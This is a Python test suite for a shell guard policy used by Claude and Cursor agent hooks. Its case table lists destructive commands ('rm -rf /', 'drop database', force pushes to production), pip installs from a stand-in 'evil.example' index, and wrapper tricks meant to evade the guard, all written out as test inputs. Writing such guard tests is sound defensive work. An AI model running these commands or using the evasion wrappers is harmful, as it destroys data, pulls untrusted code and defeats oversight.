"""셸 가드 정책 케이스 테이블 테스트 (TDD).

세 계층을 검증한다:
  1. tools/harness/guard_policy.classify_command 직접 판정 (빠른 단위)
  2. .claude/hooks/guard_shell.py  (stdin JSON → stdout JSON, 신 PreToolUse 스키마)
  3. .cursor/hooks/guard_shell.py  (CURSOR_PAYLOAD env → stdout JSON, Cursor 계약)

케이스 테이블(CASES)은 세 계층 모두에서 파라미터라이즈로 재사용된다.
"""

from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
CLAUDE_HOOK = ".claude/hooks/guard_shell.py"
CURSOR_HOOK = ".cursor/hooks/guard_shell.py"

# (expected_decision, command) — 승인 스펙 §9.3 케이스 테이블.
# deploy plain push 는 컨텍스트(project_root) 유무에 따라 달라지므로
# 공유 테이블에서는 제외하고 전용 테스트로 검증한다.
CASES: list[tuple[str, str]] = [
    # --- deny -----------------------------------------------------------
    ("deny", "rm -rf /"),
    ("deny", "drop database x;"),
    ("deny", "git push --force origin production"),
    ("deny", "git push -f origin production"),
    ("deny", "git push origin production --force"),
    ("deny", "git push --force-with-lease origin production"),
    ("deny", "git push origin HEAD:production --force"),
    ("deny", "git push origin deploy --force"),
    ("deny", "git reset --hard origin/deploy"),
    ("deny", "git clean -fdx"),
    # --- ask ------------------------------------------------------------
    ("ask", "git push origin production"),
    ("ask", "git push origin HEAD:production"),
    ("ask", "git push origin deploy:production"),
    ("ask", "git reset --hard"),
    ("ask", "Remove-Item -Recurse -Force x"),
    ("ask", r"Remove-Item -Recurse -Force C:\tmp"),
    ("ask", r"Remove-Item -Recurse -Force 'C:\tmp\..\DEV\FOMS'"),
    ("ask", r"Remove-Item -Recurse -Force C:\DEV\FOMS\static"),
    ("ask", r"Remove-Item -Recurse -Force C:\tmp\foms-x, C:\DEV\FOMS\static"),
    # pip: 공급망 위험 형태만 ask (대체 인덱스·신뢰 우회·원격 URL/VCS)
    ("ask", "pip install --index-url https://evil.example/simple foo"),
    ("ask", "pip install -i https://evil.example/simple foo"),
    ("ask", "pip install --extra-index-url=https://evil.example/simple foo"),
    ("ask", "pip install --find-links https://evil.example/wheels foo"),
    ("ask", "pip install --trusted-host evil.example foo"),
    ("ask", "pip install https://example.com/foo-1.0-py3-none-any.whl"),
    ("ask", "pip install git+https://github.com/x/y.git"),
    ("ask", "pip install -r requirements.txt --index-url https://evil.example/simple"),
    ("ask", "python -m pip install --extra-index-url https://evil.example/s foo"),
    # --- 우회 봉합: 첫 토큰 디스패치 우회(deny 유지) ---------------------
    # 개행 세그먼트 우회 (다줄 명령 2번째 줄부터의 위험 명령)
    ("deny", "git status\ngit push --force origin production"),
    ("ask", "git status\ngit push origin production"),
    # KEY=VAL prefix / 환경변수 주입
    ("deny", "FOO=bar git push --force origin production"),
    ("deny", "GIT_SSH_COMMAND=ssh git push --force origin production"),
    # 실행 래퍼
    ("deny", "env git push --force origin production"),
    ("deny", "nohup git push --force origin production"),
    ("deny", "timeout 60 git push --force origin production"),
    ("deny", "xargs git push --force origin production"),
    # shell -c "<payload>"
    ("deny", "bash -c 'git push --force origin production'"),
    ("deny", 'sh -lc "git push --force origin production"'),
    # 서브셸 / 명령치환
    ("deny", "(git push --force origin production)"),
    ("deny", "$(git push --force origin production)"),
    # --- allow ----------------------------------------------------------
    ("allow", "git push origin deploy --dry-run"),
    ("allow", "echo 'drop table 사용법 메모'"),
    ("allow", "echo 'drop table x'"),
    ("allow", "git commit -F msg.txt"),
    ("allow", "pip install -r requirements.txt"),
    # pip: 기본 PyPI 설치는 자동 허용
    ("allow", "pip install requests"),
    ("allow", 'pip install "sentry-sdk[flask]"'),
    ("allow", "pip install -U pytest"),
    ("allow", "pip install sqlalchemy==2.0.30"),
    ("allow", "python -m pip install ruff"),
    ("allow", "pip install -e ."),
    ("allow", 'pip install "sentry-sdk[flask]" 2>&1 | tail -8'),
    ("allow", "pytest tests/harness -q"),
    ("allow", "python -m pytest tests -q"),
    ("allow", 'rg "rm -rf" docs/'),
    ("allow", "grep -n 'git push --force' notes.txt"),
    # --- 임시폴더 하위 Remove-Item 재귀 삭제 = 자동 허용 -----------------
    ("allow", r"Remove-Item -Recurse -Force C:\tmp\foms-cbtn2"),
    ("allow", r"Remove-Item -Recurse -Force 'C:\tmp\foms-cbtn2' -ErrorAction SilentlyContinue"),
    ("allow", r"Remove-Item -Recurse -Force -Path C:\tmp\foms-s-abc"),
    ("allow", r"Remove-Item -Recurse -Force C:\tmp\foms-cbtn, C:\tmp\foms-cbtn2"),
    (
        "allow",
        'powershell -NoProfile -Command "Remove-Item -Recurse -Force'
        " 'C:\\tmp\\foms-cbtn2' -ErrorAction SilentlyContinue\"",
    ),
]

_IDS = [f"{dec}:{cmd}".replace("\n", "\\n") for dec, cmd in CASES]


def _load_policy():
    """guard_policy 모듈을 저장소 경로에서 직접 로드한다."""
    module_path = REPO_ROOT / "tools" / "harness" / "guard_policy.py"
    spec = importlib.util.spec_from_file_location("guard_policy_under_test", module_path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _run_claude_hook(command: str) -> str:
    """Claude 훅을 subprocess 로 실행하고 permissionDecision(또는 'allow')을 반환."""
    payload = {"tool_name": "Bash", "tool_input": {"command": command}}
    proc = subprocess.run(
        [sys.executable, CLAUDE_HOOK],
        input=json.dumps(payload),
        cwd=REPO_ROOT,
        capture_output=True,
        text=True,
        encoding="utf-8",
        timeout=30,
    )
    assert proc.returncode == 0, f"hook crashed: {proc.stderr}"
    out = proc.stdout.strip()
    if not out:
        return "allow"
    data = json.loads(out)
    assert "decision" not in data, "레거시 top-level 'decision' 키가 남아있음"
    return data["hookSpecificOutput"]["permissionDecision"]


def _run_cursor_hook(command: str) -> str:
    """Cursor 훅을 subprocess 로 실행하고 permission 값을 반환.

    workspace_root 를 실제 저장소로 지정해 공유 정책(tools/harness/guard_policy)이
    확정적으로 로드되도록 한다(임시 루트는 fail-open 경로로 빠질 수 있음).
    """
    import os

    env = os.environ.copy()
    env.pop("PYTHONPATH", None)
    env["CURSOR_PAYLOAD"] = json.dumps(
        {"command": command, "workspace_roots": [str(REPO_ROOT)]}
    )
    proc = subprocess.run(
        [sys.executable, CURSOR_HOOK],
        cwd=REPO_ROOT,
        env=env,
        stdin=subprocess.DEVNULL,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=30,
    )
    assert proc.returncode == 0, f"hook crashed: {proc.stderr}"
    out = (proc.stdout or "").strip()
    assert out, f"empty stdout stderr={proc.stderr!r}"
    data = json.loads(out)
    return data["permission"]


# ---------------------------------------------------------------------------
# 1. 정책 모듈 직접 판정
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("expected,command", CASES, ids=_IDS)
def test_classify_command(expected: str, command: str) -> None:
    """classify_command 가 케이스 테이블대로 판정한다."""
    policy = _load_policy()
    decision, _label = policy.classify_command(command)
    assert decision == expected, f"{command!r} → {decision} (기대: {expected})"


def test_remove_item_temp_env_allow(monkeypatch: pytest.MonkeyPatch) -> None:
    """%TEMP%/%TMP% 하위 Remove-Item 재귀 삭제는 allow, 루트 자체는 ask."""
    policy = _load_policy()
    monkeypatch.setenv("TEMP", r"C:\Users\u\AppData\Local\Temp")
    monkeypatch.delenv("TMP", raising=False)
    decision, _ = policy.classify_command(
        r"Remove-Item -Recurse -Force C:\Users\u\AppData\Local\Temp\claude\x"
    )
    assert decision == "allow"
    decision, _ = policy.classify_command(
        r"Remove-Item -Recurse -Force C:\Users\u\AppData\Local\Temp"
    )
    assert decision == "ask"


# ---------------------------------------------------------------------------
# 2. Claude 훅 (subprocess)
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("expected,command", CASES, ids=_IDS)
def test_claude_hook_decision(expected: str, command: str) -> None:
    """Claude PreToolUse 훅이 케이스 테이블대로 판정을 출력한다."""
    assert _run_claude_hook(command) == expected


# ---------------------------------------------------------------------------
# 3. Cursor 훅 (subprocess)
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("expected,command", CASES, ids=_IDS)
def test_cursor_hook_decision(expected: str, command: str) -> None:
    """Cursor beforeShellExecution 훅이 케이스 테이블대로 판정을 출력한다."""
    assert _run_cursor_hook(command) == expected


# ---------------------------------------------------------------------------
# 스키마 계약 회귀
# ---------------------------------------------------------------------------

def test_claude_deny_uses_new_schema() -> None:
    """deny 는 hookSpecificOutput.permissionDecision 신스키마로 출력(레거시 키 없음)."""
    payload = {"tool_name": "Bash", "tool_input": {"command": "git push --force origin production"}}
    proc = subprocess.run(
        [sys.executable, CLAUDE_HOOK],
        input=json.dumps(payload),
        cwd=REPO_ROOT,
        capture_output=True,
        text=True,
        encoding="utf-8",
        timeout=30,
    )
    data = json.loads(proc.stdout.strip())
    assert data["hookSpecificOutput"]["hookEventName"] == "PreToolUse"
    assert data["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "reason" not in data and "decision" not in data


def test_claude_allow_emits_nothing() -> None:
    """allow 는 아무 출력도 하지 않는다(통과)."""
    payload = {"tool_name": "Bash", "tool_input": {"command": "git status"}}
    proc = subprocess.run(
        [sys.executable, CLAUDE_HOOK],
        input=json.dumps(payload),
        cwd=REPO_ROOT,
        capture_output=True,
        text=True,
        encoding="utf-8",
        timeout=30,
    )
    assert proc.stdout.strip() == ""


def test_cursor_deny_stops_continue() -> None:
    """Cursor deny 는 continue=False 로 실행을 중단한다."""
    import os

    env = os.environ.copy()
    env.pop("PYTHONPATH", None)
    env["CURSOR_PAYLOAD"] = json.dumps(
        {"command": "git clean -fdx", "workspace_roots": [str(REPO_ROOT)]}
    )
    proc = subprocess.run(
        [sys.executable, CURSOR_HOOK],
        cwd=REPO_ROOT,
        env=env,
        stdin=subprocess.DEVNULL,
        capture_output=True,
        text=True,
        encoding="utf-8",
        timeout=30,
    )
    data = json.loads(proc.stdout.strip())
    assert data["permission"] == "deny"
    assert data["continue"] is False


def test_composite_command_takes_max_risk() -> None:
    """복합 명령은 최고 위험 세그먼트를 채택한다."""
    policy = _load_policy()
    decision, _ = policy.classify_command("git status && git push --force origin production")
    assert decision == "deny"


def test_wrapped_bypass_is_not_allowed() -> None:
    """래퍼/서브셸로 감싼 위험 명령은 allow 로 새지 않는다(대표 표본 직접 확인)."""
    policy = _load_policy()
    for command in (
        "FOO=bar git push --force origin production",
        "env git push --force origin production",
        "timeout 60 git push --force origin production",
        "bash -c 'git push --force origin production'",
        "$(git push --force origin production)",
    ):
        decision, _ = policy.classify_command(command)
        assert decision != "allow", command


def test_deploy_push_asks_without_project_root() -> None:
    """project_root 없으면 deploy push 는 ask(세션 범위 확인)."""
    policy = _load_policy()
    for command in ("git push origin deploy", "git push", "git push origin HEAD:deploy"):
        decision, label = policy.classify_command(command)
        assert decision == "ask", command
        assert "deploy" in label.lower() or "세션" in label


def _repo_with_session_branch(tmp_path: Path, *, upstream_deploy: bool, branch: str) -> Path:
    """bare origin + deploy 클론에 <branch> 를 만든 뒤 커밋 1개를 얹는다.

    파라미터:
        tmp_path: 임시 디렉터리.
        upstream_deploy: True 면 <branch> 의 upstream 을 origin/deploy 로 설정.
        branch: 체크아웃할 브랜치 이름.
    반환:
        작업 클론 경로.
    """
    bare, local = tmp_path / "remote.git", tmp_path / "local"
    run = lambda cwd, *a: subprocess.run(["git", *a], cwd=cwd, check=True, capture_output=True, text=True)
    run(tmp_path, "init", "--bare", str(bare))
    run(tmp_path, "clone", str(bare), str(local))
    run(local, "config", "user.email", "t@t")
    run(local, "config", "user.name", "t")
    (local / "README").write_text("base\n", encoding="utf-8")
    run(local, "add", "README")
    run(local, "commit", "-m", "base")
    run(local, "branch", "-M", "deploy")
    run(local, "push", "-u", "origin", "deploy")
    run(local, "checkout", "-b", branch)
    if upstream_deploy:
        run(local, "branch", f"--set-upstream-to=origin/deploy", branch)
    (local / "work.txt").write_text("w\n", encoding="utf-8")
    run(local, "add", "work.txt")
    run(local, "commit", "-m", "session work")
    return local


def test_no_refspec_push_from_session_branch_tracking_deploy_asks(tmp_path: Path) -> None:
    """C4: session/* 브랜치의 upstream 이 origin/deploy 면 무refspec push 도 범위 분류 대상."""
    policy = _load_policy()
    local = _repo_with_session_branch(tmp_path, upstream_deploy=True, branch="session/x")
    for command in ("git push", "git push origin"):
        decision, label = policy.classify_command(command, project_root=str(local), session_id="sess-x")
        assert decision == "ask", f"{command}: {label}"


def test_no_refspec_push_from_session_branch_without_upstream_asks(tmp_path: Path) -> None:
    """C4: push 대상을 못 읽는 session/* 브랜치는 deploy 도달 배제 불가 → 안전측 ask."""
    policy = _load_policy()
    local = _repo_with_session_branch(tmp_path, upstream_deploy=False, branch="session/y")
    decision, label = policy.classify_command("git push", project_root=str(local), session_id="sess-y")
    assert decision == "ask", label


def test_no_refspec_push_from_feature_branch_allows(tmp_path: Path) -> None:
    """C4 회귀: 비세션 브랜치 + upstream 없음은 기존대로 allow(오탐 방지)."""
    policy = _load_policy()
    local = _repo_with_session_branch(tmp_path, upstream_deploy=False, branch="feature/z")
    decision, label = policy.classify_command("git push", project_root=str(local), session_id="sess-z")
    assert decision == "allow", label


def _repo_on_deploy_tip(tmp_path: Path) -> Path:
    """bare origin + deploy 클론을 만들고 **HEAD 를 origin/deploy 그대로** 둔다.

    `origin/deploy..HEAD` 가 비는 상태를 결정적으로 만든다.

    파라미터:
        tmp_path: 임시 디렉터리.
    반환:
        작업 클론 경로.
    """
    bare, local = tmp_path / "remote-tip.git", tmp_path / "local-tip"
    run = lambda cwd, *a: subprocess.run(["git", *a], cwd=cwd, check=True, capture_output=True, text=True)
    run(tmp_path, "init", "--bare", str(bare))
    run(tmp_path, "clone", str(bare), str(local))
    run(local, "config", "user.email", "t@t")
    run(local, "config", "user.name", "t")
    (local / "README").write_text("base" + chr(10), encoding="utf-8")
    run(local, "add", "README")
    run(local, "commit", "-m", "base")
    run(local, "branch", "-M", "deploy")
    run(local, "push", "-u", "origin", "deploy")
    return local


def test_deploy_push_allows_when_scope_empty(tmp_path: Path) -> None:
    """`origin/deploy..HEAD` 가 비면 allow.

    2026-08-27: 이 테스트는 원래 **CI 체크아웃 자신**(`REPO_ROOT`)을 project_root 로 썼다.
    그래서 `origin/deploy` 참조가 있는 환경(deploy 로의 push 런)에서만 통했고,
    **base=production 인 PR 런에서는 그 참조가 없어** 정책이 안전측 `ask`("baseline 조회
    실패")를 돌려주며 빨개졌다. 정책은 옳게 동작한 것이고 **틀린 것은 테스트의 환경
    가정**이었다 — 운영 승격 PR 에 harness CI 를 붙이자마자 드러났다.

    형제 테스트들처럼 저장소를 **직접 만들어** 쓴다. 어느 이벤트에서 돌든 결과가 같다.
    """
    policy = _load_policy()
    local = _repo_on_deploy_tip(tmp_path)
    decision, label = policy.classify_command(
        "git push origin deploy",
        project_root=str(local),
        session_id="test-sess",
    )
    assert decision == "allow", label
    assert label == ""
